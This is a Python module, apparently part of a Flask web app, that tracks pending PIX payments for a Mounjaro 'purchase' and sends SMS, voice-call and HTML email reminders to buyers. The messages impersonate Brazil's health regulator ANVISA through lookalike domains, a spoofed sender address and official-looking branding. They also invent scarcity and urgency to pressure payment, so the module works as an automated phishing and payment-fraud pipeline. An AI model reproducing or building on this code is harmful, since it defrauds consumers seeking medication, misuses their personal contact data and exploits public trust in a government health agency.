import os
import time
import threading
import logging
import requests
from datetime import datetime, timedelta
from flask import current_app
from app import db
from models import Purchase

# Configure logging
logging.basicConfig(level=logging.INFO, 
                   format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Dictionary to store pending payments that need reminders
# Format: {transaction_id: {'created_at': timestamp, 'sent_reminder': False, 'customer_data': {...}}}
pending_payments = {}

# API endpoint for sending SMS
MANUAL_NOTIFICATION_API = "https://neto-contatonxcase.replit.app/api/manual-notification"

def register_payment(transaction_id, customer_data):
    """
    Register a new payment for tracking and reminder purposes
    Also starts async thread to send initial notification SMS
    
    Args:
        transaction_id: The unique ID of the transaction
        customer_data: Dictionary with customer data (name, phone, etc.)
    """
    now = datetime.utcnow()
    pending_payments[transaction_id] = {
        'created_at': now,
        'sent_reminder': False,
        'customer_data': customer_data
    }
    logger.info(f"[PAYMENT_TRACKER] New payment registered: {transaction_id}")
    logger.info(f"[PAYMENT_TRACKER] Customer data: {customer_data}")
    
    # Send initial SMS for new payment generation immediately (asyncronously)
    success = send_initial_payment_sms(transaction_id, customer_data)
    
    # Verificar se a thread de SMS foi iniciada com sucesso
    if not success:
        # Tentar novamente após um breve atraso
        logger.warning(f"[PAYMENT_TRACKER] Initial SMS thread failed for {transaction_id}, scheduling retry in 30 seconds")
        
        def retry_send():
            time.sleep(30)
            logger.info(f"[PAYMENT_TRACKER] Retrying initial SMS for {transaction_id}")
            send_initial_payment_sms(transaction_id, customer_data)
        
        # Iniciar uma thread para tentar novamente após 30 segundos
        retry_thread = threading.Thread(target=retry_send)
        retry_thread.daemon = True
        retry_thread.start()

def mark_payment_completed(transaction_id):
    """
    Mark a payment as completed, removing it from the pending payments tracker
    
    Args:
        transaction_id: The unique ID of the transaction to mark as completed
    """
    if transaction_id in pending_payments:
        del pending_payments[transaction_id]
        logger.info(f"[PAYMENT_TRACKER] Payment completed and removed from tracking: {transaction_id}")

def send_initial_payment_sms(transaction_id, customer_data):
    """
    Send SMS notification when a PIX payment is first generated
    Starts a thread to send the SMS asynchronously
    
    Args:
        transaction_id: The unique ID of the transaction
        customer_data: Dictionary with customer data
        
    Returns:
        bool: True if thread was started successfully, False otherwise
    """
    # Extract customer data
    customer_name = customer_data.get('name', '')
    phone_number = customer_data.get('phone', '')
    
    if not phone_number:
        logger.error(f"[PAYMENT_TRACKER] Cannot send initial SMS - no phone number for {transaction_id}")
        return False
    
    # Iniciar uma thread para enviar o SMS em segundo plano
    try:
        logger.info(f"[PAYMENT_TRACKER] Starting async thread for initial SMS to {phone_number} for transaction {transaction_id}")
        
        sms_thread = threading.Thread(
            target=_send_initial_payment_sms_async,
            args=(transaction_id, customer_data)
        )
        sms_thread.daemon = True
        sms_thread.start()
        
        return True
        
    except Exception as e:
        logger.error(f"[PAYMENT_TRACKER] Error starting thread for initial SMS for {transaction_id}: {str(e)}")
        return False

def _send_initial_payment_sms_async(transaction_id, customer_data):
    """
    Send SMS notification asynchronously when a PIX payment is first generated
    This function runs in a separate thread
    
    Args:
        transaction_id: The unique ID of the transaction
        customer_data: Dictionary with customer data
    """
    # Extract customer data
    customer_name = customer_data.get('name', '')
    phone_number = customer_data.get('phone', '')
    email = customer_data.get('email', '')
    
    if not phone_number:
        logger.error(f"[PAYMENT_TRACKER][ASYNC] Cannot send initial SMS - no phone number for {transaction_id}")
        return
    
    # Get first name only
    first_name = customer_name.split(' ')[0] if customer_name else ''
    
    # Formatação do número de telefone para formato internacional
    # Garantir que comece com 55 para Brasil
    if not phone_number.startswith('55'):
        phone_number = '55' + phone_number.lstrip('+')
    
    # HTML template for email - mesmo template para mensagem inicial e lembrete
    email_template = """<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PIX Gerado para Mounjaro</title>

<table border="0" cellpadding="0" cellspacing="0" width="100%">
    <tbody>
        <tr>
            <td align="center" valign="top" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">
                <table border="0" cellpadding="0" cellspacing="0" width="600" style="max-width: 600px;">
                    <!-- Cabeçalho -->
                    <tbody>
                        <tr>
                            <td align="center" bgcolor="#006400" style="padding: 30px; color: white;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="background" data-bg-color="rgb(0, 100, 0)">
                                <h1 style="margin: 0; font-size: 24px; font-weight: bold; color: white;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">PIX Gerado para Mounjaro!</h1>
                                <p style="margin: 10px 0 0 0; font-size: 14px; color: white;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">Últimas 200 unidades disponíveis! Sua reserva expira em breve.</p>
                            </td>
                        </tr>

                        <!-- Conteúdo principal -->
                        <tr>
                            <td bgcolor="#ffffff" style="padding: 30px; color: #333333;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="background" data-bg-color="rgb(255, 255, 255)">
                                <p style="margin: 0 0 15px 0;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">
                                    Olá, <strong>{{firstName}}</strong>,
                                </p>
                                <p style="margin: 0 0 15px 0;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">
                                    A Agência Nacional de Vigilância Sanitária (ANVISA) informa que seu PIX para aquisição do Mounjaro foi gerado com sucesso. Nosso estoque é limitado, com apenas 200 unidades restantes.
                                </p>
                                <p style="margin: 0 0 20px 0;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">
                                    Para garantir sua reserva, realize o pagamento do PIX o mais rápido possível. A validade da sua reserva é limitada!
                                </p>

                                <!-- Box de destaque -->
                                <table border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color: #F5F5F5; border-left: 4px solid #FFD700; margin: 0 0 20px 0;">
                                    <tbody>
                                        <tr>
                                            <td style="padding: 15px;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">
                                                <p style="margin: 0; font-weight: bold;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">Próximos passos:</p>
                                                <ol style="margin: 10px 0 0 20px; padding: 0;">
                                                    <li style="margin-bottom: 8px;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">Acesse o link para realizar o pagamento do PIX</li>
                                                    <li style="margin-bottom: 8px;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">Confirme o pagamento para garantir sua reserva</li>
                                                    <li class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">Aguarde a confirmação e detalhes da entrega</li>
                                                </ol>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>

                                <!-- Botão de ação -->
                                <table border="0" cellpadding="0" cellspacing="0" width="100%">
                                    <tbody>
                                        <tr>
                                            <td align="center" style="padding: 20px 0;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">
                                                <table border="0" cellpadding="0" cellspacing="0">
                                                    <tbody>
                                                        <tr>
                                                            <td bgcolor="#000080" style="border-radius: 4px;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="background" data-bg-color="rgb(0, 0, 128)">
                                                                <a href="{{link_encurtado}}" target="_blank" style="display: inline-block; padding: 12px 25px; color: white; text-decoration: none; font-weight: bold; font-size: 16px;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="button">PAGAR PIX AGORA</a>
                                                            </td>
                                                        </tr>
                                                    </tbody>
                                                </table>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </td>
                        </tr>

                        <!-- Rodapé -->
                        <tr>
                            <td bgcolor="#F5F5F5" style="padding: 20px; text-align: center; border-top: 1px solid #DDDDDD;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="background" data-bg-color="rgb(245, 245, 245)">
                                <p style="margin: 0 0 10px 0; color: #666666; font-size: 12px;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">
                                    <a href="https://www.gov.br/anvisa/pt-br" style="color: #666666; text-decoration: none; margin: 0 10px;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="button">Políticas de Privacidade</a> | 
                                    <a href="https://www.gov.br/anvisa/pt-br" style="color: #666666; text-decoration: none; margin: 0 10px;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="button">Termos de Serviço</a>
                                </p>
                                <p style="margin: 0; color: #666666; font-size: 12px;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">
                                    Este é um e-mail automático. Não responda diretamente. Para dúvidas, acesse o site oficial da ANVISA.
                                </p>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </td>
        </tr>
    </tbody>
</table>"""
    
    try:
        # Message template for new PIX generation
        message = f"ANVISA INFORMA: Seu Pedido MOUNJARO (1 CAIXA COM 4 UNIDADES) foi gerado com sucesso. Finalize o pagamento do QRcode PIX e confirme a sua compra antes que expire"
        
        logger.info(f"[PAYMENT_TRACKER][ASYNC] Sending initial SMS to {phone_number} for transaction {transaction_id}")
        
        # Prepare request data with additional parameters as per API docs
        request_data = {
            'phone': phone_number,
            'message': message,
            'enableVoiceCall': True,
            'campaignName': "SEGURO1",
            'shortenableLink': f"https://anvisa.vigilancia-sanitaria.org/remarketing/{transaction_id}", 
            'shortenerDomain': "anvisadobrasil.org",
            'voiceApiUrl': "https://v1.call4u.com.br/api/integrations/add/37d097caf1299d9aa79c2c2b843d2d78/default"
        }
        
        # Adicionar parâmetros de e-mail conforme solicitado
        if email:
            # Adicionar suporte a e-mail
            request_data['enableEmail'] = True
            request_data['email'] = email
            request_data['emailSubject'] = 'ANVISA: Seu PIX para Mounjaro Está Pronto! Pague Agora'
            request_data['emailTemplate'] = email_template
            request_data['emailSenderName'] = 'Anvisa Informa'
            request_data['emailSenderAddress'] = "noreply@anvisadobrasil.org"
            # Adicionar variáveis para o template de e-mail
            request_data['variables'] = {
                'firstName': first_name,
                'fullName': customer_name,
                'link_encurtado': f"https://anvisa.vigilancia-sanitaria.org/remarketing/{transaction_id}"
            }
            logger.info(f"[PAYMENT_TRACKER][ASYNC] Added email parameters for {email} with variables: {{'firstName': '{first_name}', 'fullName': '{customer_name}', 'link_encurtado': 'https://anvisa.vigilancia-sanitaria.org/remarketing/{transaction_id}'}}")
        
        logger.info(f"[PAYMENT_TRACKER][ASYNC] SMS request data: {request_data}")
        
        # Send SMS via the API
        response = requests.post(
            MANUAL_NOTIFICATION_API,
            json=request_data,
            timeout=10  # Adicionar timeout para evitar bloqueios longos
        )
        
        logger.info(f"[PAYMENT_TRACKER][ASYNC] SMS API response status: {response.status_code}")
        
        if response.status_code == 200:
            response_data = response.json()
            logger.info(f"[PAYMENT_TRACKER][ASYNC] Initial payment SMS sent successfully for {transaction_id}. Response: {response_data}")
        else:
            logger.error(f"[PAYMENT_TRACKER][ASYNC] Failed to send initial SMS for {transaction_id}. Status: {response.status_code}, Response: {response.text}")
            
    except Exception as e:
        logger.error(f"[PAYMENT_TRACKER][ASYNC] Error sending initial SMS for {transaction_id}: {str(e)}")



def send_reminder_sms(transaction_id, customer_data):
    """
    Send reminder SMS for pending payment after 10 minutes
    Starts a thread to send the SMS asynchronously
    
    Args:
        transaction_id: The unique ID of the transaction
        customer_data: Dictionary with customer data
        
    Returns:
        bool: True if thread was started successfully, False otherwise
    """
    # Extract customer data
    customer_name = customer_data.get('name', '')
    phone_number = customer_data.get('phone', '')
    
    if not phone_number:
        logger.error(f"[PAYMENT_TRACKER] Cannot send reminder SMS - no phone number for {transaction_id}")
        return False
    
    # Iniciar uma thread para enviar o SMS em segundo plano
    try:
        logger.info(f"[PAYMENT_TRACKER] Starting async thread for reminder SMS to {phone_number} for transaction {transaction_id}")
        
        sms_thread = threading.Thread(
            target=_send_reminder_sms_async,
            args=(transaction_id, customer_data)
        )
        sms_thread.daemon = True
        sms_thread.start()
        
        # Mark that we've sent a reminder for this payment
        if transaction_id in pending_payments:
            pending_payments[transaction_id]['sent_reminder'] = True
            logger.info(f"[PAYMENT_TRACKER] Marked transaction {transaction_id} as having received reminder")
        
        return True
        
    except Exception as e:
        logger.error(f"[PAYMENT_TRACKER] Error starting thread for reminder SMS for {transaction_id}: {str(e)}")
        return False

def _send_reminder_sms_async(transaction_id, customer_data):
    """
    Send reminder SMS asynchronously for pending payment
    This function runs in a separate thread
    
    Args:
        transaction_id: The unique ID of the transaction
        customer_data: Dictionary with customer data
    """
    # Extract customer data
    customer_name = customer_data.get('name', '')
    phone_number = customer_data.get('phone', '')
    email = customer_data.get('email', '')
    
    if not phone_number:
        logger.error(f"[PAYMENT_TRACKER][ASYNC] Cannot send reminder SMS - no phone number for {transaction_id}")
        return
    
    # Get first name only
    first_name = customer_name.split(' ')[0] if customer_name else ''
    
    # Formatação do número de telefone para formato internacional
    # Garantir que comece com 55 para Brasil
    if not phone_number.startswith('55'):
        phone_number = '55' + phone_number.lstrip('+')
    
   
    try:
        # Message template for reminder with customer's first name and transaction ID
        message = f"URGENTE: {first_name}, o PIX para seu Medicamento está pronto! Apenas 50 unidades disponíveis, reserve logo. Pague aqui:https://anvisa.vigilancia-sanitaria.org/remarketing/{transaction_id}"
        
        logger.info(f"[PAYMENT_TRACKER][ASYNC] Sending reminder SMS to {phone_number} for transaction {transaction_id}")
        
        # Prepare request data with additional parameters as per API docs
        request_data = {
            'phone': phone_number,
            'message': message,
            'enableVoiceCall': True,
            'campaignName': "INFORMAGERADO",
            'shortenableLink': f"https://anvisa.vigilancia-sanitaria.org/remarketing/{transaction_id}", 
            'shortenerDomain': "anvisadobrasil.org",
        }
        

  
        logger.info(f"[PAYMENT_TRACKER][ASYNC] Reminder SMS request data: {request_data}")
        
        # Send SMS via the API
        response = requests.post(
            MANUAL_NOTIFICATION_API,
            json=request_data,
            timeout=10  # Adicionar timeout para evitar bloqueios longos
        )
        
        logger.info(f"[PAYMENT_TRACKER][ASYNC] Reminder SMS API response status: {response.status_code}")
        
        if response.status_code == 200:
            response_data = response.json()
            logger.info(f"[PAYMENT_TRACKER][ASYNC] Reminder SMS sent successfully for {transaction_id}. Response: {response_data}")
        else:
            logger.error(f"[PAYMENT_TRACKER][ASYNC] Failed to send reminder SMS for {transaction_id}. Status: {response.status_code}, Response: {response.text}")
            
    except Exception as e:
        logger.error(f"[PAYMENT_TRACKER][ASYNC] Error sending reminder SMS for {transaction_id}: {str(e)}")



def check_pending_payments():
    """
    Check all pending payments and:
    1. Send reminders for those pending over 10 minutes
    2. Remove payments that have been pending for more than 30 minutes
    """
    now = datetime.utcnow()
    reminder_threshold = timedelta(minutes=10)
    expiration_threshold = timedelta(minutes=30)
    
    # Log the current state of pending payments
    num_pending = len(pending_payments)
    if num_pending > 0:
        logger.info(f"[PAYMENT_TRACKER] Checking {num_pending} pending payments")
        for transaction_id, data in pending_payments.items():
            time_elapsed = now - data['created_at']
            minutes_elapsed = time_elapsed.total_seconds() / 60
            reminder_sent = data['sent_reminder']
            logger.debug(f"[PAYMENT_TRACKER] Transaction {transaction_id} pending for {minutes_elapsed:.1f} minutes, reminder sent: {reminder_sent}")
    
    # Iterate over a copy of the items to safely modify the dictionary
    for transaction_id, data in list(pending_payments.items()):
        # Calculate how long the payment has been pending
        time_elapsed = now - data['created_at']
        minutes_elapsed = time_elapsed.total_seconds() / 60
        
        # Check if payment should be expired and removed after 30 minutes
        if time_elapsed >= expiration_threshold:
            logger.warning(f"[PAYMENT_TRACKER] Payment {transaction_id} expired after {minutes_elapsed:.1f} minutes, removing from tracking")
            del pending_payments[transaction_id]
            continue
            
        # Check if payment needs a reminder (only if one hasn't been sent already)
        if not data['sent_reminder'] and time_elapsed >= reminder_threshold:
            logger.info(f"[PAYMENT_TRACKER] Payment {transaction_id} pending for {minutes_elapsed:.1f} minutes, sending reminder")
            success = send_reminder_sms(transaction_id, data['customer_data'])
            
            # Se falhar ao enviar o SMS, não marcar como enviado para tentar novamente na próxima verificação
            if not success:
                logger.warning(f"[PAYMENT_TRACKER] Failed to send reminder SMS for {transaction_id}, will retry later")

def payment_reminder_worker():
    """
    Background worker that periodically checks for pending payments
    and sends reminders as needed
    """
    logger.info("[PAYMENT_TRACKER] =====================================================")
    logger.info("[PAYMENT_TRACKER] Starting payment reminder worker thread")
    logger.info("[PAYMENT_TRACKER] Check interval: 30 seconds")
    logger.info("[PAYMENT_TRACKER] Reminder threshold: 10 minutes")
    logger.info("[PAYMENT_TRACKER] Expiration threshold: 30 minutes")
    logger.info("[PAYMENT_TRACKER] SMS API endpoint: %s", MANUAL_NOTIFICATION_API)
    logger.info("[PAYMENT_TRACKER] =====================================================")
    
    while True:
        try:
            check_pending_payments()
        except Exception as e:
            logger.error(f"[PAYMENT_TRACKER] Error in payment reminder worker: {str(e)}")
        
        # Check every 30 seconds
        time.sleep(30)

def start_payment_reminder_worker():
    """
    Starts the background worker thread to monitor payments and send reminders
    """
    worker_thread = threading.Thread(target=payment_reminder_worker, daemon=True)
    worker_thread.start()
    logger.info("[PAYMENT_TRACKER] Payment reminder worker thread started")
    return worker_thread
